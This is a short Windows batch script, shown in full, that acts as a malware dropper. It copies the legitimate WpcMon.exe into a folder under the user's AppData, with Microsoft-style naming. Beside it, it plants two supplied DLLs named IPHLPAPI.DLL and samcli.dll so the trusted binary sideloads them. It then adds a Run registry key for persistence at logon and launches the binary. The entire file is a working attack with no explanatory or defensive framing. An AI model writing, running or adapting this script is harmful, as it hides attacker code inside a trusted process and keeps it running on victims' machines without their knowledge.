@echo off
mkdir "%LOCALAPPDATA%\Microsoft\WpcMon"
copy /y "%WINDIR%\System32\WpcMon.exe" "%LOCALAPPDATA%\Microsoft\WpcMon\WpcMon.exe"
copy /y "%~1" "%LOCALAPPDATA%\Microsoft\WpcMon\IPHLPAPI.DLL"
copy /y "%~2" "%LOCALAPPDATA%\Microsoft\WpcMon\samcli.dll"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WpcMon /t REG_SZ /d "%LOCALAPPDATA%\Microsoft\WpcMon\WpcMon.exe" /f
start "" "%LOCALAPPDATA%\Microsoft\WpcMon\WpcMon.exe"
